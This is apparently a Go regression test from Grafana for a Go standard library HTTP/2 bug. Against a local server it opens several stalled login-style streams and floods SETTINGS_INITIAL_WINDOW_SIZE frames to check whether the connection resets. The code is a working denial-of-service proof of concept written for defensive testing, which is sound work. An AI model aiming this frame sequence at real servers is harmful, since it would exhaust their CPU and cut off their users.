package api

import (
	"bytes"
	"crypto/tls"
	"io"
	"math"
	"net"
	"net/http"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/stretchr/testify/require"
	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"

	"github.com/grafana/grafana/pkg/infra/log"
	"github.com/grafana/grafana/pkg/setting"
	"github.com/grafana/grafana/pkg/web"
)

// TestHTTP2InitialWindowChangesDoNotResetConnection is the spec for the
// stdlib HTTP/2 SETTINGS_INITIAL_WINDOW_SIZE CPU bug.
//
// Go 1.26.6 adjusts every open stream on each SETTINGS frame that carries
// SETTINGS_INITIAL_WINDOW_SIZE, and it closes the connection with
// FLOW_CONTROL_ERROR as soon as any one of those streams would pass the
// maximum window. That per-stream walk is the excessive CPU. The fixed
// library records the new initial window in constant time and leaves the
// connection up, so this test fails until go.mod is at least 1.26.9.
//
// The peer is unauthenticated. It holds streams open the same way a login
// request does: POST a partial application/json body and let web.Bind block
// inside json.Decoder. Protocol h2 and socket_h2 are the server modes that
// enable HTTP/2; https clears TLSNextProto and does not.
func TestHTTP2InitialWindowChangesDoNotResetConnection(t *testing.T) {
	for _, protocol := range []setting.Scheme{setting.HTTP2Scheme, setting.SocketHTTP2Scheme} {
		t.Run(string(protocol), func(t *testing.T) {
			addr, handlers := startGrafanaH2Server(t, protocol)
			err := floodInitialWindow(t, addr, handlers)
			require.NoError(t, err)
		})
	}
}

func startGrafanaH2Server(t *testing.T, protocol setting.Scheme) (string, *atomic.Int32) {
	t.Helper()

	cfg := setting.NewCfg()
	cfg.Protocol = protocol
	cfg.MinTLSVersion = "TLS1.2"
	cfg.Domain = "localhost"
	cfg.ReadTimeout = 0

	var handlers atomic.Int32
	hs := &HTTPServer{
		log: log.New("http2-initial-window-test"),
		Cfg: cfg,
	}
	hs.httpSrv = &http.Server{
		ReadTimeout: cfg.ReadTimeout,
		Handler: http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			handlers.Add(1)
			// Same body read as the unauthenticated form login client.
			var form struct {
				User     string `json:"user" binding:"Required"`
				Password string `json:"password" binding:"Required"`
			}
			_ = web.Bind(r, &form)
			w.WriteHeader(http.StatusUnauthorized)
		}),
	}
	require.NoError(t, hs.configureTLS())

	ln, err := net.Listen("tcp", "127.0.0.1:0")
	require.NoError(t, err)
	go func() {
		_ = hs.httpSrv.ServeTLS(ln, "", "")
	}()
	t.Cleanup(func() {
		_ = hs.httpSrv.Close()
	})
	t.Cleanup(func() {
		require.Greater(t, handlers.Load(), int32(0), "login-style handler never ran")
	})
	return ln.Addr().String(), &handlers
}

func floodInitialWindow(t *testing.T, addr string, handlers *atomic.Int32) error {
	t.Helper()
	conn, err := tls.Dial("tcp", addr, &tls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{"h2"},
		MinVersion:         tls.VersionTLS12,
	})
	if err != nil {
		return err
	}
	defer conn.Close()
	require.Equal(t, "h2", conn.ConnectionState().NegotiatedProtocol)

	if _, err := io.WriteString(conn, http2.ClientPreface); err != nil {
		return err
	}
	fr := http2.NewFramer(conn, conn)
	var mu sync.Mutex
	write := func(fn func() error) error {
		mu.Lock()
		defer mu.Unlock()
		return fn()
	}
	if err := write(func() error { return fr.WriteSettings() }); err != nil {
		return err
	}

	const streams = 8
	pings := make(chan struct{}, 2)
	goaways := make(chan http2.ErrCode, 2)
	readErr := make(chan error, 1)
	go func() {
		for {
			f, err := fr.ReadFrame()
			if err != nil {
				readErr <- err
				return
			}
			switch ff := f.(type) {
			case *http2.SettingsFrame:
				if !ff.IsAck() {
					if err := write(func() error { return fr.WriteSettingsAck() }); err != nil {
						readErr <- err
						return
					}
				}
			case *http2.PingFrame:
				if ff.IsAck() {
					pings <- struct{}{}
				}
			case *http2.GoAwayFrame:
				goaways <- ff.ErrCode
			}
		}
	}()

	if err := write(func() error { return fr.WritePing(false, [8]byte{1}) }); err != nil {
		return err
	}
	select {
	case <-pings:
	case code := <-goaways:
		t.Fatalf("server sent GOAWAY %v before the attack", code)
	case err := <-readErr:
		return err
	case <-time.After(5 * time.Second):
		t.Fatal("server did not acknowledge the setup ping")
	}

	var hdr bytes.Buffer
	enc := hpack.NewEncoder(&hdr)
	for _, hf := range []hpack.HeaderField{
		{Name: ":method", Value: "POST"},
		{Name: ":scheme", Value: "https"},
		{Name: ":authority", Value: "localhost"},
		{Name: ":path", Value: "/login"},
		{Name: "content-type", Value: "application/json"},
	} {
		require.NoError(t, enc.WriteField(hf))
	}
	block := append([]byte(nil), hdr.Bytes()...)
	for i := 0; i < streams; i++ {
		id := uint32(1 + 2*i)
		if err := write(func() error {
			if err := fr.WriteHeaders(http2.HeadersFrameParam{
				StreamID: id, BlockFragment: block, EndHeaders: true,
			}); err != nil {
				return err
			}
			// Partial JSON, no END_STREAM: web.Bind blocks and the stream stays open.
			return fr.WriteData(id, false, []byte(`{"user":"`))
		}); err != nil {
			return err
		}
	}
	require.Eventually(t, func() bool {
		return handlers.Load() >= streams
	}, 5*time.Second, 5*time.Millisecond)

	// Lift every stream's send window to the ceiling, then apply the attack:
	// many small SETTINGS_INITIAL_WINDOW_SIZE updates, and one increase that
	// would push a per-stream window past 2^31-1. The vulnerable server
	// discovers that only by visiting each stream.
	ceiling := uint32(math.MaxInt32 - 65535)
	for i := 0; i < streams; i++ {
		id := uint32(1 + 2*i)
		if err := write(func() error { return fr.WriteWindowUpdate(id, ceiling) }); err != nil {
			return err
		}
	}
	for i := 0; i < 32; i++ {
		val := uint32(65535)
		if i%2 == 1 {
			val = 65534
		}
		if err := write(func() error {
			return fr.WriteSettings(http2.Setting{ID: http2.SettingInitialWindowSize, Val: val})
		}); err != nil {
			return err
		}
	}
	if err := write(func() error {
		return fr.WriteSettings(http2.Setting{ID: http2.SettingInitialWindowSize, Val: 65536})
	}); err != nil {
		return err
	}
	if err := write(func() error { return fr.WritePing(false, [8]byte{2}) }); err != nil {
		return err
	}

	select {
	case <-pings:
		return nil
	case code := <-goaways:
		t.Fatalf("HTTP/2 connection reset with %v while streams were open; SETTINGS_INITIAL_WINDOW_SIZE is still applied per stream", code)
	case err := <-readErr:
		t.Fatalf("HTTP/2 connection closed while streams were open: %v", err)
	case <-time.After(5 * time.Second):
		t.Fatal("server did not acknowledge a ping after SETTINGS_INITIAL_WINDOW_SIZE updates")
	}
	return nil
}
